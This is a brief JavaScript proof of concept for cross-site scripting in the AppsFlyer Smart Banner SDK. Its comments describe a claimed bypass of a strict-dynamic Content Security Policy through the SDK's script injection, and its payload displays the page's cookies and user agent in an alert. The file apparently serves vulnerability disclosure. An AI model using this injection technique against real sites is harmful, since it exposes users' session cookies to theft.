// AppsFlyer Smart Banner XSS PoC - s1n6h
// CSP BYPASS: createElement('script') + innerHTML bypasses strict-dynamic CSP
// The SDK's _inject() creates <script> via document.createElement and sets innerHTML
// strict-dynamic allows dynamically inserted scripts → CSP BYPASSED
alert('XSS confirmed on: ' + window.location.origin + '\n\nCookies: ' + document.cookie + '\nUser-Agent: ' + navigator.userAgent);
